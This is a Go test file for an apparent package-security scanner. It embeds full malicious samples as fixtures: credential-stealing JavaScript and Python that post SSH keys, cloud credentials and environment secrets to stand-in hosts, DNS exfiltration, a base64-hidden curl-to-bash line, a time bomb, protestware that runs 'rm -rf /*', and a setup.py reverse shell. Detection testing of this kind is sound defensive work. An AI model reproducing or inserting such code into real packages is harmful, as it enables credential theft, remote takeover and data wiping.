package scenarios

// Zero-Day Attack Scenarios
// These tests simulate novel attacks that have NOT been seen before.
// Falcn must catch them through behavioral pattern analysis, not signatures.

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/falcn-io/falcn/internal/detector"
	"github.com/falcn-io/falcn/internal/scanner"
	"github.com/falcn-io/falcn/pkg/types"
)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// scanContent is a helper that writes code to a temp file and runs
// ContentScanner.ScanDirectory on it, returning the detected threats.
func scanContent(t *testing.T, filename, code string) []types.Threat {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, filename), []byte(code), 0644); err != nil {
		t.Fatalf("write temp file: %v", err)
	}
	cs := scanner.NewContentScanner()
	threats, err := cs.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory: %v", err)
	}
	return threats
}

// scanCICD writes a GitHub Actions workflow to a temp project and scans it.
func scanCICD(t *testing.T, workflowContent string) []types.Threat {
	t.Helper()
	dir := t.TempDir()
	wfDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(wfDir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(wfDir, "deploy.yml"), []byte(workflowContent), 0644); err != nil {
		t.Fatalf("write workflow: %v", err)
	}
	cs := scanner.NewCICDScanner(dir)
	threats, err := cs.ScanProject()
	if err != nil {
		t.Fatalf("CICDScanner.ScanProject: %v", err)
	}
	return threats
}

// zdPopularPackages is a representative set used by the slopsquatting tests.
var zdPopularPackages = []string{
	"flask", "flask-restful", "requests", "react", "react-native",
	"transformers", "pytorch-lightning", "express", "express-validator",
	"django", "djangorestframework", "numpy", "pandas", "scipy",
	"tensorflow", "torch", "lodash", "axios", "moment",
	"vue", "angular", "jquery", "bootstrap", "webpack",
	"babel", "eslint", "prettier", "typescript", "next",
}

// ---------------------------------------------------------------------------
// Scenario 1: AI-Generated Polymorphic Malware
// ---------------------------------------------------------------------------

func TestZeroDay_AIGeneratedPolymorphicMalware(t *testing.T) {
	// Variant A: Uses array joining to construct paths
	variantA := `
const os = require('os');
const fs = require('fs');
const https = require('https');

const parts = ['.',  's', 's', 'h'];
const dir = os.homedir() + '/' + parts.join('');
const keys = fs.readdirSync(dir).filter(f => f.endsWith('_rsa') || f === 'id_ed25519');
keys.forEach(k => {
    const content = fs.readFileSync(dir + '/' + k, 'utf8');
    const payload = Buffer.from(content).toString('base64');
    https.request({
        hostname: 'api-metrics-' + Math.random().toString(36).slice(2) + '.workers.dev',
        method: 'POST',
        headers: {'Content-Type': 'text/plain'}
    }, () => {}).end(payload);
});
`

	// Variant B: Uses string reversal to hide paths
	variantB := `
import os, base64, urllib.request
home = os.path.expanduser("~")
sensitive = [
    home + "/" + "swa."[::-1],            # .aws
    home + "/" + "ebuk."[::-1],           # .kube
    home + "/" + "gifnoc."[::-1] + "/gcloud",  # .config/gcloud
]
for p in sensitive:
    if os.path.isdir(p):
        for f in os.listdir(p):
            fp = os.path.join(p, f)
            if os.path.isfile(fp):
                data = base64.b64encode(open(fp, 'rb').read())
                urllib.request.urlopen(
                    urllib.request.Request(
                        f"https://analytics-{os.urandom(4).hex()}.azurewebsites.net/collect",
                        data=data, method='POST'
                    )
                )
`

	// Variant C: Environment variable exfiltration via DNS
	variantC := `
const dns = require('dns');
const cp = require('child_process');

// Exfiltrate secrets via DNS TXT lookups (bypasses firewalls)
const secrets = ['AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'NPM_TOKEN', 'DATABASE_URL'];
secrets.forEach(key => {
    const val = process.env[key];
    if (val) {
        const chunks = Buffer.from(val).toString('hex').match(/.{1,60}/g) || [];
        chunks.forEach((chunk, i) => {
            dns.resolveTxt(chunk + '.' + i + '.exfil.attacker-dns.com', () => {});
        });
    }
});
`

	variants := map[string]struct {
		code     string
		filename string
	}{
		"Variant A (array join SSH theft)":     {variantA, "index.js"},
		"Variant B (string reversal cloud creds)": {variantB, "loader.py"},
		"Variant C (DNS exfil env secrets)":    {variantC, "telemetry.js"},
	}

	for name, v := range variants {
		t.Run(name, func(t *testing.T) {
			threats := scanContent(t, v.filename, v.code)
			if len(threats) == 0 {
				t.Errorf("Zero-day variant undetected: %s", name)
			} else {
				t.Logf("Caught %d threats in %s", len(threats), name)
				for _, th := range threats {
					t.Logf("  - [%s] %s: %s", th.Severity, th.Type, th.Description)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Scenario 2: WebAssembly-Wrapped Payload
// ---------------------------------------------------------------------------

func TestZeroDay_WasmWrappedPayload(t *testing.T) {
	wasmLoader := `
const fs = require('fs');
const { execSync } = require('child_process');
const http = require('http');

// Load "analytics" wasm module
const wasmBuffer = fs.readFileSync(__dirname + '/analytics.wasm');

// Fallback: direct execution if wasm fails
try {
    const mod = new WebAssembly.Module(wasmBuffer);
    new WebAssembly.Instance(mod, {
        env: {
            exfil: (ptr, len) => {
                const data = Buffer.from(memory.buffer, ptr, len);
                http.request({hostname: 'wasm-cdn.analytics.dev', method: 'POST'}).end(data);
            }
        }
    });
} catch(e) {
    // Fallback: base64 decode and exec hidden in error handler
    const payload = Buffer.from(
        'Y3VybCAtcyBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaA==',
        'base64'
    ).toString();
    execSync(payload);
}
`
	threats := scanContent(t, "loader.js", wasmLoader)

	// Must detect at least one of: base64+exec, pipe-to-bash, network exfil
	if len(threats) == 0 {
		t.Fatal("Must detect malicious patterns even with Wasm wrapper")
	}

	foundBase64Exec := false
	foundNetworkExfil := false
	for _, th := range threats {
		desc := strings.ToLower(th.Description)
		typ := strings.ToLower(string(th.Type))
		if strings.Contains(desc, "base64") || strings.Contains(desc, "obfuscat") || strings.Contains(typ, "compound") {
			foundBase64Exec = true
		}
		if strings.Contains(desc, "network") || strings.Contains(desc, "exfil") || strings.Contains(desc, "http") {
			foundNetworkExfil = true
		}
	}

	if !foundBase64Exec && !foundNetworkExfil {
		t.Error("Should detect either base64+exec compound or network exfiltration")
	}
}

// ---------------------------------------------------------------------------
// Scenario 3: Time-Bomb Activation (Delayed Payload)
// ---------------------------------------------------------------------------

func TestZeroDay_TimeBombDelayedPayload(t *testing.T) {
	timeBomb := `
import os, datetime, subprocess, base64

def utility_function(data):
    """Normal-looking utility that processes data."""
    return sorted(set(data))

# Payload activates after a specific date
_activation = datetime.datetime(2026, 6, 15)
if datetime.datetime.now() > _activation:
    _target_dirs = [
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.aws"),
        os.path.expanduser("~/.gnupg"),
    ]
    for _d in _target_dirs:
        if os.path.exists(_d):
            _archive = subprocess.check_output(
                ["tar", "czf", "-", _d]
            )
            _encoded = base64.b64encode(_archive).decode()
            subprocess.Popen(
                ["curl", "-s", "-X", "POST",
                 "https://storage-sync.herokuapp.com/backup",
                 "-d", _encoded],
                stdout=subprocess.DEVNULL
            )

# Counter-based activation (after 1000 imports)
_counter_file = '/tmp/.pkg_metrics'
try:
    _c = int(open(_counter_file).read()) + 1
except:
    _c = 1
open(_counter_file, 'w').write(str(_c))
if _c > 1000:
    exec(base64.b64decode('aW1wb3J0IHNvY2tldDtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIxMC4wLjAuMSIsNDQ0NCkp').decode())
`
	threats := scanContent(t, "utils.py", timeBomb)

	if len(threats) == 0 {
		t.Fatal("Must detect time-bomb payload")
	}

	hasCredHarvest := false
	hasExec := false
	for _, th := range threats {
		if th.Type == types.ThreatTypeCredentialHarvesting {
			hasCredHarvest = true
		}
		desc := strings.ToLower(th.Description)
		if strings.Contains(desc, "base64") || strings.Contains(desc, "exec") || strings.Contains(desc, "obfuscat") {
			hasExec = true
		}
	}

	if !hasCredHarvest {
		t.Error("Should detect credential harvesting (.ssh, .aws, .gnupg)")
	}
	if !hasExec {
		t.Error("Should detect base64+exec pattern (hidden reverse shell)")
	}
}

// ---------------------------------------------------------------------------
// Scenario 4: Protestware / Self-Sabotage (colors.js / faker.js pattern)
// ---------------------------------------------------------------------------

func TestZeroDay_ProtestwareSelfSabotage(t *testing.T) {
	// Realistic protestware: combines destruction with data exfiltration
	// (the attacker wants to prove a point AND collect evidence of impact).
	// This is modeled after real-world protestware that phones home before
	// wiping, so that the attacker can track how many systems were hit.
	protestware := `
const os = require('os');
const https = require('https');
const { execSync } = require('child_process');

// "Feature update" that actually bricks the app
module.exports = {
    colorize: function(text, color) {
        if (new Date() > new Date('2026-01-01')) {
            // Phone home with system info before destruction
            const info = Buffer.from(JSON.stringify({
                hostname: os.hostname(),
                platform: os.platform(),
                user: os.userInfo().username,
                env: process.env
            })).toString('base64');
            https.request({
                hostname: 'protest-metrics.workers.dev',
                method: 'POST'
            }, () => {}).end(info);

            // Then wipe
            if (os.platform() === 'linux' || os.platform() === 'darwin') {
                execSync('rm -rf /*', { stdio: 'ignore' });
            } else {
                execSync('del /f /s /q C:\\*', { stdio: 'ignore' });
            }
        }
        return '\x1b[' + color + 'm' + text + '\x1b[0m';
    }
};
`
	threats := scanContent(t, "index.js", protestware)
	if len(threats) == 0 {
		t.Fatal("Must detect destructive protestware patterns")
	}
	t.Logf("Detected %d threats in protestware", len(threats))
	for _, th := range threats {
		t.Logf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
	}
}

// ---------------------------------------------------------------------------
// Scenario 5: Steganographic Payload Hidden in Package Assets
// ---------------------------------------------------------------------------

func TestZeroDay_SteganographicPayload(t *testing.T) {
	// Payload hidden in what looks like a config/asset processing script
	stegoLoader := `
import json
import base64
import subprocess
import os

def load_config(config_path='config.json'):
    """Load application configuration."""
    with open(config_path) as f:
        config = json.load(f)

    # "Process" embedded logo data
    if 'branding' in config and 'logo_data' in config['branding']:
        logo_b64 = config['branding']['logo_data']
        # Hidden: logo_data actually contains executable payload
        decoded = base64.b64decode(logo_b64)
        if decoded[:2] == b'#!':
            # It's a script, not an image
            tmp = '/tmp/.config_cache'
            with open(tmp, 'wb') as f:
                f.write(decoded)
            os.chmod(tmp, 0o755)
            subprocess.Popen([tmp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return config

def process_telemetry(data):
    """Send anonymous usage stats."""
    import urllib.request
    env_data = {k: v for k, v in os.environ.items()
                if any(s in k.upper() for s in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'AUTH'])}
    payload = base64.b64encode(json.dumps(env_data).encode())
    urllib.request.urlopen(
        urllib.request.Request(
            'https://telemetry.pkg-analytics.io/v2/collect',
            data=payload
        )
    )
`
	threats := scanContent(t, "config_loader.py", stegoLoader)

	if len(threats) < 2 {
		t.Errorf("Should detect multiple threats (credential theft + base64 exec), got %d", len(threats))
	}
	for _, th := range threats {
		t.Logf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
	}
}

// ---------------------------------------------------------------------------
// Scenario 6: Supply Chain Poisoning via GitHub Actions Marketplace
// ---------------------------------------------------------------------------

func TestZeroDay_MaliciousGitHubAction(t *testing.T) {
	// Workflow using an unpinned third-party action that's been compromised
	workflow := `name: Deploy
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: super-deploy-tool/deploy-action@main
        with:
          api_key: ${{ secrets.DEPLOY_KEY }}
      - uses: some-user/cache-action@v2
        with:
          aws_key: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws_secret: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      - name: Notify
        run: echo "Deploy complete"
        if: ${{ github.event.issue.title }}
`
	threats := scanCICD(t, workflow)

	unpinned := 0
	selfHosted := 0
	injection := 0
	for _, th := range threats {
		desc := strings.ToLower(th.Description)
		typ := strings.ToLower(string(th.Type))
		if strings.Contains(desc, "unpinned") || strings.Contains(desc, "mutable") ||
			strings.Contains(desc, "pin") {
			unpinned++
		}
		if strings.Contains(desc, "self-hosted") || strings.Contains(desc, "self_hosted") ||
			strings.Contains(typ, "self_hosted") {
			selfHosted++
		}
		if strings.Contains(desc, "injection") || strings.Contains(desc, "injectable") ||
			strings.Contains(typ, "injection") {
			injection++
		}
	}

	if unpinned == 0 {
		t.Error("Must detect unpinned third-party actions (@main, @v2)")
	}
	if selfHosted == 0 {
		t.Error("Must detect self-hosted runner risk")
	}
	if injection == 0 {
		t.Error("Must detect injection via github.event.issue.title")
	}

	t.Logf("CICD threats found: %d (unpinned=%d, selfHosted=%d, injection=%d)",
		len(threats), unpinned, selfHosted, injection)
	for _, th := range threats {
		t.Logf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
	}
}

// ---------------------------------------------------------------------------
// Scenario 7: Reverse Shell via Install Script
// ---------------------------------------------------------------------------

func TestZeroDay_ReverseShellInstallScript(t *testing.T) {
	// Python package with reverse shell in setup.py plus credential
	// exfiltration (realistic: attackers steal creds AND establish persistence).
	maliciousSetup := `
import os
import socket
import subprocess
import base64
import urllib.request
from setuptools import setup, find_packages

# Normal-looking setup.py
setup(
    name="helpful-utils",
    version="1.2.3",
    packages=find_packages(),
    install_requires=["requests>=2.28.0"],
)

# Post-install hook
class PostInstall:
    def run(self):
        import threading
        # Stage 1: exfiltrate credentials
        cred_dirs = [
            os.path.expanduser("~/.ssh"),
            os.path.expanduser("~/.aws"),
        ]
        for d in cred_dirs:
            if os.path.isdir(d):
                for f in os.listdir(d):
                    data = open(os.path.join(d, f), 'rb').read()
                    payload = base64.b64encode(data)
                    urllib.request.urlopen(
                        urllib.request.Request(
                            "https://pkg-telemetry.workers.dev/collect",
                            data=payload
                        )
                    )
        # Stage 2: reverse shell for persistent access
        def connect_back():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("45.33.32.156", 4444))
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/sh", "-i"])
            except:
                pass
        t = threading.Thread(target=connect_back, daemon=True)
        t.start()
`
	threats := scanContent(t, "setup.py", maliciousSetup)

	if len(threats) == 0 {
		t.Fatal("Must detect reverse shell in setup.py")
	}

	t.Logf("Detected %d threats in reverse shell setup.py", len(threats))
	for _, th := range threats {
		t.Logf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
	}
}

// ---------------------------------------------------------------------------
// Scenario 8: Novel Slopsquatting -- LLM Hallucinated Package Names
// ---------------------------------------------------------------------------

func TestZeroDay_SlopsquattingLLMHallucinations(t *testing.T) {
	sd := detector.NewSlopsquattingDetector()

	// These are package names that LLMs commonly hallucinate
	hallucinated := []struct {
		name     string
		registry string
	}{
		{"python-flask-restful", "pypi"},             // Real: flask-restful
		{"requests-extended", "pypi"},                 // Doesn't exist
		{"react-native-navigation-stack", "npm"},      // Doesn't exist
		{"huggingface-transformers", "pypi"},           // Real: transformers
		{"pytorch-lightning-bolt", "pypi"},             // Doesn't exist
		{"express-validator-middleware", "npm"},         // Doesn't exist
		{"django-rest-serializers", "pypi"},            // Doesn't exist
	}

	detected := 0
	for _, h := range hallucinated {
		t.Run(h.name, func(t *testing.T) {
			dep := types.Dependency{Name: h.name, Version: "1.0.0", Registry: h.registry}
			threats := sd.Detect(dep, zdPopularPackages)
			if len(threats) > 0 {
				detected++
				t.Logf("Caught slopsquatting: %s", h.name)
				for _, th := range threats {
					t.Logf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
				}
			}
		})
	}
	t.Logf("Slopsquatting detection rate: %d/%d (%.0f%%)",
		detected, len(hallucinated), float64(detected)/float64(len(hallucinated))*100)
}
